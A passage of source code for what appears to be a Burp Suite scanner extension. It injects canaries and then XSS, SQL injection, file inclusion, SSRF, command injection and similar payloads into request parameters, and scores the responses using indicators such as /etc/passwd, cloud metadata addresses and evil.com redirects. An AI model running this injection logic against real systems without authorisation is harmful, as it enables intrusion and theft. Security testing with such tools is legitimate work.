                                    g = [gp]
                                    mp = set([pname])
                                    self.trigger_executor.submit(lambda n=n, u=u, m=m, msg=msg_copy, ri=ri, g=g, mp=mp:
                                        self._two_stage_trigger(n, u, m, msg, ri, g, mp))
                                    break

            reflected = []
            for pname, pval, ptype, is_json in grep_params:
                if pval and len(pval) > 1 and pval in resp_body_str and pname not in matched_any:
                    reflected.append((pname, pval, ptype, is_json))
            if reflected:
                rnames = ", ".join([p[0] for p in reflected])
                key = (host, path, method)
                self._add_finding("REFLECTED", url_str, method, status, length,
                                  rnames, full_param_values, "Heuristic reflection", msg, key)
                self._log("Heuristic reflection detected: %s @ %s" % (rnames, url_str))

                if self.trigger_enabled and not self.stealth_mode:
                    for rp in reflected:
                        pname, pval, ptype, is_json = rp
                        if not self._dedup_can_test(host, path, pname, "xss"):
                            continue
                        u = url_str
                        m = method
                        msg_copy = msg
                        ri = req_info
                        g = [(pname, pval, ptype, is_json)]
                        mp = set([pname])
                        self.trigger_executor.submit(lambda u=u, m=m, msg=msg_copy, ri=ri, g=g, mp=mp:
                            self._two_stage_trigger("xss", u, m, msg, ri, g, mp))

        except Exception as e:
            self._log("[Analyze] Error: %s" % str(e))

    def _detect_waf(self, host, response_bytes):
        if response_bytes is None:
            return None
        resp_str = self.helpers.bytesToString(response_bytes).lower()
        headers = self.helpers.analyzeResponse(response_bytes).getHeaders()
        header_str = ' '.join([h.lower() for h in headers])
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in resp_str or sig.lower() in header_str:
                    return waf_name
        return None

    def _is_captcha_challenge(self, response_bytes):
        if response_bytes is None:
            return False
        resp_str = self.helpers.bytesToString(response_bytes).lower()
        captcha_sigs = ['g-recaptcha', 'recaptcha', 'captcha', "i'm not a robot", 'hcaptcha', 'cf-challenge']
        return any(s in resp_str for s in captcha_sigs)

    def _add_waf_log(self, host, waf_type, evidence):
        ts = datetime.now().strftime("%H:%M:%S")
        self.waf_log.append({'host': host, 'waf': waf_type, 'evidence': evidence, 'ts': ts})
        def upd():
            self.waf_model.addRow([len(self.waf_log), host, waf_type, evidence, ts])
        SwingUtilities.invokeLater(SwingRun(upd))

    def _extract_json_targets(self, msg, req_info):
        targets = []
        headers = req_info.getHeaders()
        content_type = ""
        for h in headers:
            if h.lower().startswith("content-type:"):
                content_type = h.split(":",1)[1].strip()
                break
        if "json" not in content_type:
            return targets
        body_offset = req_info.getBodyOffset()
        req_bytes = msg.getRequest()
        if req_bytes is None or len(req_bytes) <= body_offset:
            return targets
        body_bytes = req_bytes[body_offset:]
        if not body_bytes:
            return targets
        try:
            body_str = self.helpers.bytesToString(body_bytes)
            data = json.loads(body_str)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, (str, int, float, bool)):
                        targets.append((k, str(v)))
                    elif v is None:
                        targets.append((k, ""))
                    elif isinstance(v, list):
                        targets.append((k, json.dumps(v)))
                        for item in v:
                            if isinstance(item, (str, int, float, bool)):
                                targets.append((k, str(item)))
        except:
            pass
        return targets

    def _add_finding(self, name, url, method, status, length, matched_params, full_params, match_str, msg, key):
        tab = self.tabs_data.get(name)
        if tab is None:
            return
        with self._lock:
            self.findings_counter += 1
            fid = self.findings_counter
            instance = {
                'id': fid, 'url': url, 'method': method, 'status': status,
                'length': length, 'param': matched_params, 'full_params': full_params,
                'match': match_str, 'message': msg
            }
            if key not in tab.uniques:
                tab.uniques[key] = {'instances':[instance], 'url':url, 'method':method,
                                    'status':status, 'length':length, 'param':matched_params,
                                    'match':match_str}
                SwingUtilities.invokeLater(SwingRun(lambda: self._add_unique_row(tab, key)))
            else:
                tab.uniques[key]['instances'].append(instance)
                SwingUtilities.invokeLater(SwingRun(lambda: self._update_unique_hits(tab, key)))

    def _add_unique_row(self, tab, key):
        data = tab.uniques[key]
        tab.unique_entries.append(key)
        tab.unique_model.addRow([
            data['instances'][0]['id'], data['url'], data['method'], data['status'],
            data['length'], data['param'], 1, data['match']
        ])
        self._update_tab_title(tab.name)

    def _update_unique_hits(self, tab, key):
        try:
            row = tab.unique_entries.index(key)
            hits = len(tab.uniques[key]['instances'])
            tab.unique_model.setValueAt(hits, row, 6)
        except:
            pass

    def _update_tab_title(self, name):
        tab = self.tabs_data.get(name)
        cnt = sum(len(u['instances']) for u in tab.uniques.values())
        title = "%s (%d)" % (name, cnt) if cnt else name
        idx = self.gf_tab_pane.indexOfComponent(tab.split_pane)
        if idx != -1:
            self.gf_tab_pane.setTitleAt(idx, title)

    # -------------------------------------------------------------------------
    # Deduplication helpers
    # -------------------------------------------------------------------------
    def _dedup_can_test(self, host, path, param_name, scan_type):
        key = "%s|%s|%s|%s" % (host, path, param_name, scan_type)
        if key in self.tested_params:
            return False
        return True

    def _dedup_mark_tested(self, host, path, param_name, scan_type):
        key = "%s|%s|%s|%s" % (host, path, param_name, scan_type)
        self.tested_params.add(key)

    def _generate_canary(self):
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return ''.join(chars[self._rand.nextInt(len(chars))] for _ in range(12))

    def _two_stage_trigger(self, pattern_name, url, method, msg, req_info, grep_params, matched_params):
        trigger_key = None
        for tk in self.TRIGGER_PAYLOADS:
            if tk.lower() in pattern_name.lower():
                trigger_key = tk
                break
        if not trigger_key:
            return

        trigger_info = self.TRIGGER_PAYLOADS[trigger_key]
        service = msg.getHttpService()
        req_bytes = msg.getRequest()
        host = str(service.getHost()).lower()

        time.sleep(self.throttle_delay / 1000.0)

        for param_data in grep_params:
            pname = param_data[0]
            pval = param_data[1]
            ptype = param_data[2]
            is_json = param_data[3]

            if pname not in matched_params:
                continue

            if not self._dedup_can_test(host, str(req_info.getUrl().getPath()), pname, trigger_key):
                continue
            self._dedup_mark_tested(host, str(req_info.getUrl().getPath()), pname, trigger_key)

            # kxss-style pre-check for XSS
            if trigger_key == 'xss':
                if not pval or len(pval) < 1:
                    continue
                baseline_body = self.helpers.bytesToString(msg.getResponse()) if msg.getResponse() else ""
                if pval not in baseline_body:
                    self._log("[Skip XSS] %s not reflected in baseline @ %s" % (pname, url))
                    continue
                ref_result = self._analyze_reflection(msg, pname, pval, service)
                if not ref_result['canary_reflected']:
                    self._log("[Skip XSS] %s canary not reflected @ %s" % (pname, url))
                    continue
                if not ref_result['unfiltered_chars']:
                    self._log("[Skip XSS] %s all special chars filtered @ %s" % (pname, url))
                    continue
                self._log("[XSS Pre-check] %s unfiltered: %s @ %s" % (pname, str(ref_result['unfiltered_chars']), url))

            canary = self._generate_canary()

            # Stage 1: Canary
            try:
                canary_req = self._inject_payload(req_bytes, pname, pval, canary, ptype, is_json)
                if canary_req is None:
                    self._log("[Canary] Injection FAILED for %s @ %s" % (pname, url))
                    continue

                time.sleep(self.throttle_delay / 1000.0)
                canary_resp_obj = self.callbacks.makeHttpRequest(service, canary_req)
                if canary_resp_obj is None or canary_resp_obj.getResponse() is None:
                    self._log("[Canary] No response for %s @ %s" % (pname, url))
                    continue

                canary_resp = canary_resp_obj.getResponse()
                baseline_resp = msg.getResponse()

                baseline_status = self.helpers.analyzeResponse(baseline_resp).getStatusCode() if baseline_resp else 0
                canary_status = self.helpers.analyzeResponse(canary_resp).getStatusCode()
                baseline_len = len(baseline_resp) if baseline_resp else 0
                canary_len = len(canary_resp)
                baseline_body = self.helpers.bytesToString(baseline_resp) if baseline_resp else ""
                canary_body = self.helpers.bytesToString(canary_resp)

                if self._is_captcha_challenge(canary_resp):
                    self._log("[Skip] CAPTCHA triggered after canary @ %s" % url)
                    continue

                changed = False
                reason = ""
                if baseline_status != canary_status:
                    changed = True
                    reason = "status"
                elif abs(baseline_len - canary_len) > 10:
                    changed = True
                    reason = "length"
                elif baseline_body != canary_body:
                    changed = True
                    reason = "body"
                elif canary in canary_body:
                    changed = True
                    reason = "canary reflected"

                if trigger_key == 'xss' and pval and pval in canary_body:
                    changed = True
                    reason = "original value reflected"

                self._log("[Canary] %s | %s | changed=%s (%s) | b=%d c=%d" % (
                    pname, url, changed, reason, baseline_len, canary_len))

                self._record_param_analysis(pname, "JSON" if is_json else self._ptype_name(ptype), pval, canary,
                                            baseline_status, canary_status, baseline_len, canary_len,
                                            msg, canary_req, canary_resp, service)

                if changed:
                    self._record_baseline_change(url, method, pname, canary, baseline_status, canary_status,
                                                 baseline_len, canary_len, msg, canary_req, canary_resp, service)
                else:
                    continue

                # Stage 2: Real payloads (context-aware filtering)
                allowed_payloads = trigger_info['payloads'][:]
                if trigger_key == 'xss':
                    ref_data = self._analyze_reflection(msg, pname, pval, service)
                    ctx = ref_data.get('context', 'unknown')
                    unfiltered = ref_data.get('unfiltered_chars', [])
                    filtered_payloads = []
                    for pl in allowed_payloads:
                        needs_quote = '"' in pl or "'" in pl
                        needs_lt = '<' in pl
                        needs_paren = '(' in pl or ')' in pl
                        ok = True
                        if needs_quote and not any(c in unfiltered for c in ['"', "'"]):
                            ok = False
                        if needs_lt and '<' not in unfiltered:
                            ok = False
                        if needs_paren and not any(c in unfiltered for c in ['(', ')']):
                            ok = False
                        if ok:
                            filtered_payloads.append(pl)
                    if filtered_payloads:
                        allowed_payloads = filtered_payloads
                    else:
                        self._log("[XSS] No payloads match unfiltered chars for %s" % pname)
                        continue

                for payload in allowed_payloads:
                    test_id = (url, pname, payload[:30])
                    with self._lock:
                        if test_id in self.tested_params:
                            continue
                        self.tested_params.add(test_id)

                    time.sleep(self.throttle_delay / 1000.0)
                    real_req = self._inject_payload(req_bytes, pname, pval, payload, ptype, is_json)
                    if real_req is None:
                        self._log("[Payload] Injection FAILED for %s @ %s" % (pname, url))
                        continue

                    time.sleep(self.throttle_delay / 1000.0)
                    real_start = time.time()
                    real_resp_obj = self.callbacks.makeHttpRequest(service, real_req)
                    real_elapsed = time.time() - real_start

                    if real_resp_obj is None or real_resp_obj.getResponse() is None:
                        continue

                    real_resp = real_resp_obj.getResponse()
                    evidence = self._analyze_trigger_advanced(trigger_key, real_resp, baseline_resp, payload, real_elapsed)

                    if evidence:
                        self._log("[FINDING] %s | %s | %s | %s" % (
                            trigger_info['vuln_name'], pname, url, evidence['confidence']))
                        self._add_confirmed(trigger_key, url, method, trigger_info['vuln_name'],
                                           payload, baseline_resp, real_resp, req_bytes, real_req,
                                           service, evidence)
                        self._add_smart_finding(url, method, pname, trigger_info['vuln_name'],
                                                evidence['confidence'], evidence['evidence'],
                                                req_bytes, real_req, real_resp, service)
                        if evidence['confidence'] in ('High', 'Critical'):
                            self._log("[Stop] High-confidence finding for %s, skipping remaining payloads" % pname)
                            break
            except Exception as e:
                self._log("[Trigger] Exception: %s" % str(e))

    def _analyze_reflection(self, msg, param_name, param_value, service):
        result = {
            'reflected': False,
            'canary_reflected': False,
            'unfiltered_chars': [],
            'context': 'unknown',
            'original_in_response': False
        }
        if not param_value or len(param_value) < 1:
            return result

        resp_bytes = msg.getResponse()
        if resp_bytes is None:
            return result
        body = self.helpers.bytesToString(resp_bytes)

        if param_value in body:
            result['original_in_response'] = True
            result['reflected'] = True
            result['context'] = self._detect_context(body, param_value)

        canary = "KXSS_%d_%s" % (int(time.time()), self._generate_canary())
        canary_req = self._inject_value(msg, param_name, param_value + canary)
        if canary_req is None:
            return result

        try:
            canary_resp_obj = self.callbacks.makeHttpRequest(service, canary_req)
            if canary_resp_obj is None or canary_resp_obj.getResponse() is None:
                return result
            canary_body = self.helpers.bytesToString(canary_resp_obj.getResponse())
            if canary in canary_body:
                result['canary_reflected'] = True
                for char in self.XSS_CHARS:
                    test_val = param_value + "aprefix" + char + "asuffix" + self._generate_canary()
                    test_req = self._inject_value(msg, param_name, test_val)
                    if test_req is None:
                        continue
                    test_resp_obj = self.callbacks.makeHttpRequest(service, test_req)
                    if test_resp_obj is None or test_resp_obj.getResponse() is None:
                        continue
                    test_body = self.helpers.bytesToString(test_resp_obj.getResponse())
                    marker = "aprefix" + char + "asuffix"
                    if marker in test_body:
                        result['unfiltered_chars'].append(char)
                    time.sleep(0.05)
        except Exception as e:
            pass

        return result

    def _detect_context(self, body, value):
        idx = body.find(value)
        if idx == -1:
            return 'unknown'
        before = body[max(0, idx-200):idx]
        if re.search(r'<script[^>]*>[^<]*$', before, re.I):
            return 'script'
        if re.search(r'[a-z]+\s*=\s*["\'][^"\']*$', before, re.I):
            return 'attr'
        if re.search(r'<[^>]*>[^<]*$', before, re.I):
            return 'html'
        if re.search(r'["\']\s*:\s*["\'][^"\']*$', before, re.I):
            return 'json'
        return 'unknown'

    def _inject_value(self, msg, param_name, new_value):
        req_info = self.helpers.analyzeRequest(msg)
        req_bytes = msg.getRequest()
        for p in req_info.getParameters():
            if p.getName() == param_name:
                pt = int(p.getType())
                try:
                    new_param = self.helpers.buildParameter(param_name, new_value, pt)
                    return self.helpers.updateParameter(req_bytes, new_param)
                except:
                    pass
        return None

    def _ptype_name(self, ptype):
        names = {0:"URL", 1:"Body", 2:"Cookie", 3:"Header", 4:"XML", 5:"XML attr", 6:"JSON"}
        return names.get(ptype, "Unknown")

    def _inject_payload(self, req_bytes, pname, pval, payload, ptype, is_json):
        if req_bytes is None:
            return None

        if is_json:
            return self._inject_json_payload(req_bytes, pname, pval, payload)

        try:
            new_param = self.helpers.buildParameter(pname, payload, ptype)
            result = self.helpers.updateParameter(req_bytes, new_param)
            if self.helpers.bytesToString(result) != self.helpers.bytesToString(req_bytes):
                return result
        except Exception as e:
            self._log("[Inject] updateParameter failed for %s: %s" % (pname, str(e)))

        if ptype == 0:
            return self._inject_url_param(req_bytes, pname, payload)
        elif ptype == 1:
            return self._inject_body_param(req_bytes, pname, payload)
        elif ptype == 2:
            return self._inject_cookie_param(req_bytes, pname, payload)
        elif ptype in (3, 4, 5):
            return self._inject_header_param(req_bytes, pname, payload)

        return None

    def _inject_url_param(self, req_bytes, pname, payload):
        req_info = self.helpers.analyzeRequest(req_bytes)
        url = req_info.getUrl()
        path = str(url.getPath())
        query = str(url.getQuery()) if url.getQuery() else ""
        if not query:
            return None
        pairs = []
        changed = False
        for part in query.split('&'):
            if '=' in part:
                k, v = part.split('=', 1)
                if unquote(k) == pname:
                    pairs.append('%s=%s' % (k, quote(payload, safe='')))
                    changed = True
                else:
                    pairs.append(part)
            else:
                if unquote(part) == pname:
                    pairs.append('%s=%s' % (part, quote(payload, safe='')))
                    changed = True
                else:
                    pairs.append(part)
        if not changed:
            return None
        new_query = '&'.join(pairs)
        old_path_query = path + '?' + query
        new_path_query = path + '?' + new_query
        req_str = self.helpers.bytesToString(req_bytes)
        method = req_info.getMethod()
        old_line = "%s %s HTTP/1." % (method, old_path_query)
        new_line = "%s %s HTTP/1." % (method, new_path_query)
        if old_line in req_str:
            new_req_str = req_str.replace(old_line, new_line, 1)
            return self.helpers.stringToBytes(new_req_str)
        if old_path_query in req_str:
            new_req_str = req_str.replace(old_path_query, new_path_query, 1)
            return self.helpers.stringToBytes(new_req_str)
        return None

    def _inject_body_param(self, req_bytes, pname, payload):
        req_info = self.helpers.analyzeRequest(req_bytes)
        body_offset = req_info.getBodyOffset()
        body = req_bytes[body_offset:] if len(req_bytes) > body_offset else None
        if not body:
            return None
        body_str = self.helpers.bytesToString(body)
        ct = ""
        for h in req_info.getHeaders():
            if h.lower().startswith("content-type:"):
                ct = h.lower()
                break
        if "json" in ct or "xml" in ct:
            return None
        pairs = []
        changed = False
        for part in body_str.split('&'):
            if '=' in part:
                k, v = part.split('=', 1)
                if unquote(k) == pname:
                    pairs.append('%s=%s' % (k, quote(payload, safe='')))
                    changed = True
                else:
                    pairs.append(part)
            else:
                if unquote(part) == pname:
                    pairs.append('%s=%s' % (part, quote(payload, safe='')))
                    changed = True
                else:
                    pairs.append(part)
        if not changed:
            return None
        new_body_str = '&'.join(pairs)
        headers = req_info.getHeaders()
        return self.helpers.buildHttpMessage(headers, self.helpers.stringToBytes(new_body_str))

    def _inject_cookie_param(self, req_bytes, pname, payload):
        req_info = self.helpers.analyzeRequest(req_bytes)
        req_str = self.helpers.bytesToString(req_bytes)
        headers = req_info.getHeaders()
        for h in headers:
            if h.lower().startswith("cookie:"):
                cookie_str = h.split(":", 1)[1].strip()
                cookies = []
                changed = False
                for c in cookie_str.split(';'):
                    c = c.strip()
                    if '=' in c:
                        k, v = c.split('=', 1)
                        if k.strip() == pname:
                            cookies.append('%s=%s' % (k.strip(), payload))
                            changed = True
                        else:
                            cookies.append(c)
                    else:
                        cookies.append(c)
                if changed:
                    new_header = "Cookie: " + '; '.join(cookies)
                    new_req_str = req_str.replace(h, new_header, 1)
                    return self.helpers.stringToBytes(new_req_str)
        return None

    def _inject_header_param(self, req_bytes, pname, payload):
        req_info = self.helpers.analyzeRequest(req_bytes)
        req_str = self.helpers.bytesToString(req_bytes)
        headers = req_info.getHeaders()
        for h in headers:
            if h.lower().startswith(pname.lower() + ":"):
                new_header = "%s: %s" % (pname, payload)
                new_req_str = req_str.replace(h, new_header, 1)
                return self.helpers.stringToBytes(new_req_str)
        return None

    def _inject_json_payload(self, req_bytes, pname, pval, payload):
        req_info = self.helpers.analyzeRequest(req_bytes)
        headers = req_info.getHeaders()
        body_offset = req_info.getBodyOffset()
        body_bytes = req_bytes[body_offset:] if len(req_bytes) > body_offset else None
        body_str = self.helpers.bytesToString(body_bytes) if body_bytes else ""
        if not body_str:
            return None
        try:
            data = json.loads(body_str)
            if isinstance(data, dict) and pname in data:
                data[pname] = payload
                new_body = self.helpers.stringToBytes(json.dumps(data))
                return self.helpers.buildHttpMessage(headers, new_body)
        except:
            pass
        patterns = [
            '"%s":"%s"' % (pname, pval),
            '"%s": "%s"' % (pname, pval),
            '"%s":%s' % (pname, pval),
            '"%s": %s' % (pname, pval),
            '"%s":true' % pname,
            '"%s":false' % pname,
            '"%s":null' % pname,
            '"%s":0' % pname,
            '"%s":' % pname,
        ]
        if pval.lower() in ('true', 'false', 'null'):
            patterns.extend(['"%s":%s' % (pname, pval.lower()), '"%s": %s' % (pname, pval.lower())])
        elif pval.isdigit():
            patterns.extend(['"%s":%s' % (pname, pval), '"%s": %s' % (pname, pval)])
        for pat in patterns:
            if pat in body_str:
                if payload.lower() in ('true', 'false', 'null') or (payload.isdigit() and not payload.startswith('0')):
                    new_pat = '"%s":%s' % (pname, payload)
                else:
                    new_pat = '"%s":"%s"' % (pname, payload)
                new_body_str = body_str.replace(pat, new_pat, 1)
                if new_body_str != body_str:
                    return self.helpers.buildHttpMessage(headers, self.helpers.stringToBytes(new_body_str))
        return None

    def _record_baseline_change(self, url, method, param, canary, b_status, c_status, b_len, c_len,
                                baseline_msg, canary_req, canary_resp, service):
        with self._lock:
            self.baseline_changes.append({
                'url': url, 'method': method, 'param': param, 'canary': canary,
                'b_status': b_status, 'c_status': c_status,
                'b_len': b_len, 'c_len': c_len, 'diff': c_len - b_len,
                'baseline_msg': baseline_msg,
                'canary_request': canary_req,
                'canary_response': canary_resp,
                'service': service
            })
        def update():
            row = [len(self.baseline_changes), url, method, param, canary,
                   b_status, c_status, b_len, c_len, c_len - b_len, "Yes"]
            self.baseline_change_model.addRow(row)
        SwingUtilities.invokeLater(SwingRun(update))

    def _add_smart_finding(self, url, method, param, vuln, confidence, evidence,
                           baseline_req, trigger_req, trigger_resp, service):
        with self._lock:
            self.smart_findings.append({
                'url': url, 'method': method, 'param': param, 'vuln': vuln,
                'confidence': confidence, 'evidence': evidence,
                'baseline_request': baseline_req,
                'trigger_request': trigger_req,
                'trigger_response': trigger_resp,
                'service': service
            })
        def update():
            row = [len(self.smart_findings), url, method, param, vuln, confidence, evidence[:80]]
            self.smart_finding_model.addRow(row)
        SwingUtilities.invokeLater(SwingRun(update))

    def _record_param_analysis(self, pname, ptype, pval, canary, b_status, c_status, b_len, c_len,
                               baseline_msg, canary_req, canary_resp, service):
        with self._lock:
            key = (pname, ptype, pval)
            if key in self._param_analysis_keys:
                return
            self._param_analysis_keys.add(key)
            entry = {
                'pname': pname, 'ptype': ptype, 'pval': pval, 'canary': canary,
                'status_change': b_status != c_status, 'len_change': c_len - b_len,
                'baseline_msg': baseline_msg,
                'canary_request': canary_req,
                'canary_response': canary_resp,
                'service': service
            }
            self.param_analysis.append(entry)
        def update():
            row = [pname, ptype, pval, canary, "Yes" if b_status != c_status else "No", c_len - b_len]
            self.param_analysis_model.addRow(row)
        SwingUtilities.invokeLater(SwingRun(update))

    def _analyze_trigger_advanced(self, trigger_key, trigger_resp, baseline_resp, payload, elapsed):
        trigger_info = self.helpers.analyzeResponse(trigger_resp)
        trigger_status = trigger_info.getStatusCode()
        trigger_body = self.helpers.bytesToString(trigger_resp)
        baseline_body = self.helpers.bytesToString(baseline_resp) if baseline_resp else ""
        baseline_status = self.helpers.analyzeResponse(baseline_resp).getStatusCode() if baseline_resp else 0

        evidence = []
        confidence = "Low"

        if trigger_key == 'xss':
            if payload in trigger_body:
                evidence.append("Exact reflection")
                confidence = "High"
            enc = payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
            if enc in trigger_body and enc != payload:
                evidence.append("HTML-encoded reflection")
                confidence = "Medium"
            tag_stripped = re.sub(r'</?[a-z][^>]*>', '', payload)
            if tag_stripped in trigger_body and tag_stripped != payload:
                evidence.append("Tags stripped, content reflected")
                confidence = "Medium"
            if re.search(r'<(pre|textarea|title|script|style|xmp)[^>]*>[^<<]*' + re.escape(payload[:20]), trigger_body, re.I):
                evidence.append("Reflected inside raw text/container tag")
                confidence = "High"
            if re.search(r'[a-z]+\s*=\s*["\'][^"\']*' + re.escape(payload[:15]), trigger_body, re.I):
                evidence.append("Reflected inside HTML attribute")
                confidence = "High"
            if re.search(r'<script[^>]*>[^<<]*' + re.escape(payload[:15]), trigger_body, re.I):
                evidence.append("Reflected inside script block")
                confidence = "Critical"
            if re.search(r'on\w+\s*=\s*["\']?[^"\'>]*' + re.escape(payload[:15]), trigger_body, re.I):
                evidence.append("Event handler injection possible")
                confidence = "Critical"

        elif trigger_key == 'sqli':
            if "sleep" in payload.lower() and elapsed > 2.5:
                evidence.append("Time-based delay: %.2f sec" % elapsed)
                confidence = "Critical"
            if "waitfor" in payload.lower() and elapsed > 2.5:
                evidence.append("Time-based delay: %.2f sec" % elapsed)
                confidence = "Critical"
            if "pg_sleep" in payload.lower() and elapsed > 2.5:
                evidence.append("Time-based delay: %.2f sec" % elapsed)
                confidence = "Critical"
            sql_errors = ["sql syntax", "mysql_fetch", "pg_query", "ora-", "unclosed quotation", "odbc error", "sqlite", "mysqli", "sqlserver", "jdbc", "database error", "syntax error", "unexpected token", "sqlstate"]
            for err in sql_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("SQL error: %s" % err)
                    confidence = "High"
                    break

        elif trigger_key == 'lfi':
            lfi_indicators = ["root:", "bin/bash", "windows", "boot loader", "etc/passwd", "win.ini", "system32", "proc/self/environ", "[boot loader]"]
            for ind in lfi_indicators:
                if ind in trigger_body.lower() and ind not in baseline_body.lower():
                    evidence.append("File content: %s" % ind)
                    confidence = "High"
                    break
            if "failed to open stream" in trigger_body.lower() or "no such file" in trigger_body.lower():
                evidence.append("File access error (path reachable)")
                confidence = "Medium"
            if "include(" in trigger_body.lower() or "require(" in trigger_body.lower():
                evidence.append("PHP include path disclosure")
                confidence = "Medium"

        elif trigger_key == 'idor':
            if trigger_status == 200 and baseline_status == 200:
                diff = len(trigger_body) - len(baseline_body)
                if abs(diff) > 100:
                    evidence.append("Length changed by %d" % diff)
                    confidence = "High"
                elif trigger_body != baseline_body:
                    evidence.append("Different response for ID %s" % payload)
                    confidence = "Medium"
            if trigger_status == 200 and baseline_status in (401, 403, 404):
                evidence.append("Access bypass: %d -> 200" % baseline_status)
                confidence = "Critical"

        elif trigger_key == 'redirect':
            if trigger_status in (301,302,307,308):
                for h in trigger_info.getHeaders():
                    if h.lower().startswith("location:"):
                        if "evil.com" in h or "interact.sh" in h:
                            evidence.append("Redirect to external domain: %s" % h)
                            confidence = "High"
                            break
            if re.search(r'location\.href\s*=\s*["\'][^"\']*evil', trigger_body, re.I):
                evidence.append("JS redirect to evil domain")
                confidence = "High"

        elif trigger_key == 'ssrf':
            if "169.254.169.254" in payload:
                if "instance-id" in trigger_body or "ami-id" in trigger_body:
                    evidence.append("AWS metadata reflected")
                    confidence = "Critical"
                elif "404" in trigger_body and "not found" in trigger_body.lower():
                    evidence.append("Internal 404 (SSRF reachable)")
                    confidence = "High"
            if "interact.sh" in payload:
                evidence.append("SSRF payload sent (check Collaborator)")
                confidence = "Medium"
            if "localhost" in payload or "127.0.0.1" in payload:
                if trigger_status in (200, 301, 302, 307, 401, 403):
                    evidence.append("Localhost responded with %d" % trigger_status)
                    confidence = "High"

        elif trigger_key == 'rce':
            rce_indicators = ["uid=", "gid=", "root", "administrator", "nt authority", "windows nt", "www-data", "apache", "nobody"]
            for ind in rce_indicators:
                if ind in trigger_body.lower() and ind not in baseline_body.lower():
                    evidence.append("Command output: %s" % ind)
                    confidence = "Critical"
                    break
            if "unable to execute" in trigger_body.lower() or "command not found" in trigger_body.lower():
                evidence.append("Command execution error")
                confidence = "High"
            if "eval()" in trigger_body.lower() or "system()" in trigger_body.lower():
                evidence.append("Code evaluation context detected")
                confidence = "Medium"

        elif trigger_key == 'ssti':
            if "49" in trigger_body and "49" not in baseline_body:
                evidence.append("Template evaluation detected (7*7=49)")
                confidence = "High"
            ssti_errors = ["freemarker", "velocity", "thymeleaf", "jinja2", "django", "template", "render", "expression", "ognl", "spel", "mako", "tornado"]
            for err in ssti_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("Template engine error: %s" % err)
                    confidence = "High"
                    break
            if re.search(r'class\s+java\.lang\.', trigger_body):
                evidence.append("Java class reflection in output")
                confidence = "Critical"

        elif trigger_key == 'nosql':
            nosql_errors = ["mongodb", "bson", "unknown operator", "$gt", "$ne", "nosql", "json parse", "cannot parse"]
            for err in nosql_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("NoSQL error: %s" % err)
                    confidence = "High"
                    break
            if trigger_status == 200 and baseline_status in (400, 500):
                evidence.append("NoSQL bypass: error -> success")
                confidence = "Medium"

        elif trigger_key == 'crlf':
            if "Set-Cookie: crlf=injected" in trigger_body or "crlf=injected" in trigger_body:
                evidence.append("CRLF injection: Set-Cookie header injected")
                confidence = "Critical"
            if trigger_status >= 400 and "header" in trigger_body.lower():
                evidence.append("Possible header injection response")
                confidence = "Medium"
            if re.search(r'X-Injected\s*:', trigger_body, re.I):
                evidence.append("Custom header injected successfully")
                confidence = "Critical"

        elif trigger_key == 'xxe':
            xxe_indicators = ["root:", "bin/bash", "etc/passwd", "win.ini", "boot loader", "system32", "proc/self/environ", "instance-id", "ami-id"]
            for ind in xxe_indicators:
                if ind in trigger_body.lower() and ind not in baseline_body.lower():
                    evidence.append("XXE file content: %s" % ind)
                    confidence = "Critical"
                    break
            xxe_errors = ["xml parsing", "DOCTYPE", "entity", "xml error", "parsererror", "fatal error", "unparsed entity"]
            for err in xxe_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("XML parser error: %s" % err)
                    confidence = "High"
                    break

        elif trigger_key == 'xpath':
            xpath_errors = ["xpath", "invalid expression", "xml path", "xquery", "invalid token", "unrecognized expression"]
            for err in xpath_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("XPath error: %s" % err)
                    confidence = "High"
                    break
            if "nodes" in trigger_body.lower() and "nodes" not in baseline_body.lower():
                evidence.append("XPath node count changed")
                confidence = "Medium"

        elif trigger_key == 'ldap':
            ldap_errors = ["ldap", "invalid dn", "directory service", "search filter", "invalid syntax", "protocol error"]
            for err in ldap_errors:
                if err in trigger_body.lower() and err not in baseline_body.lower():
                    evidence.append("LDAP error: %s" % err)
                    confidence = "High"
                    break
            if "objectclass" in trigger_body.lower() and "objectclass" not in baseline_body.lower():
                evidence.append("LDAP objectClass leaked")
                confidence = "High"

        if evidence:
            return {
                'evidence': "; ".join(evidence),
                'confidence': confidence,
                'trigger_status': trigger_status
            }
        return None

    def _add_confirmed(self, trigger_key, url, method, vuln_name, payload,
                       baseline_resp, trigger_resp, baseline_req, trigger_req, service, evidence):
        if trigger_key not in self.confirmed_tabs:
            ctab = ConfirmedTabData(vuln_name)
            self.confirmed_tabs[trigger_key] = ctab
            self.main_tab_pane.addTab("CONFIRMED-%s" % vuln_name, ctab.scroll)
            ctab.table.getSelectionModel().addListSelectionListener(ConfirmedSelectionListener(self, ctab))
            ctab.table.addMouseListener(ConfirmedPopupListener(self, ctab))
        ctab = self.confirmed_tabs[trigger_key]
        with self._lock:
            self.confirmed_counter += 1
            cid = self.confirmed_counter
            confirmed = {
                'id': cid, 'url': url, 'method': method, 'vuln': vuln_name,
                'payload': payload,
                'baseline_status': self.helpers.analyzeResponse(baseline_resp).getStatusCode() if baseline_resp else 0,
                'trigger_status': evidence['trigger_status'],
                'baseline_len': len(baseline_resp) if baseline_resp else 0,
                'trigger_len': len(trigger_resp),
                'evidence': evidence['evidence'],
                'confidence': evidence['confidence'],
                'baseline_request': baseline_req,
                'baseline_response': baseline_resp,
                'trigger_request': trigger_req,
                'trigger_response': trigger_resp,
                'service': service
            }
            ctab.findings.append(confirmed)
            self.confirmed_findings.append(confirmed)
        def upd():
            ctab.model.addRow([
                cid, url, method, vuln_name, payload[:80],
                confirmed['baseline_status'], evidence['trigger_status'],
                confirmed['baseline_len'], confirmed['trigger_len'],
                evidence['evidence'][:60], evidence['confidence']
            ])
            idx = self.main_tab_pane.indexOfComponent(ctab.scroll)
            if idx != -1:
                cnt = len(ctab.findings)
                self.main_tab_pane.setTitleAt(idx, "CONFIRMED-%s (%d)" % (vuln_name, cnt))
            self._update_status()
